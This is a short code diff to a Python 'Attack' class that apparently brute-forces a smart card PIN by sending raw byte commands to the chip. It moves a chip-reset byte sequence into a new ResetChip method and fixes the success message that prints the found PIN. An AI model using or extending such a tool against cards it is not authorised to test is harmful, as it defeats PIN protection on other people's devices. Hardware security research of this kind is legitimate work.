@@ -34,6 +34,10 @@ class Attack():
     self.stoping = True
     print('[!] You pressed Ctrl+C!  ')
 
+  def ResetChip(self):
+    RSET = [0x3B, 0x9F, 0x96, 0x80, 0x1F, 0xC6, 0x80, 0x31, 0xE0, 0x73, 0xFE, 0x21, 0x1B, 0x64, 0x41, 0x04, 0x81, 0x00, 0x82, 0x90, 0x00, 0x04]
+    data, sw1, sw2 = self.xmit(RSET)
+
   def xmit(self,Command):
     if not self.stoping:
       try:
@@ -104,7 +108,7 @@ class Attack():
         self.stoping = True
 
       if self.Found: # Status for successful attack
-        print("[*] The PIN is: " % N)
+        print("[*] The PIN is: [ %s ]!!!" % N)
         #self.runtime()
         #sys.exit(0)
         self.stoping = True
@@ -113,8 +117,7 @@ class Attack():
         time.sleep(waittime)
 
       if self.reset: # reset the chip
-        RSET = [0x3B, 0x9F, 0x96, 0x80, 0x1F, 0xC6, 0x80, 0x31, 0xE0, 0x73, 0xFE, 0x21, 0x1B, 0x64, 0x41, 0x04, 0x81, 0x00, 0x82, 0x90, 0x00, 0x04]
-        data, sw1, sw2 = self.xmit(RSET)
+        self.ResetChip()
 
       n += 1
 
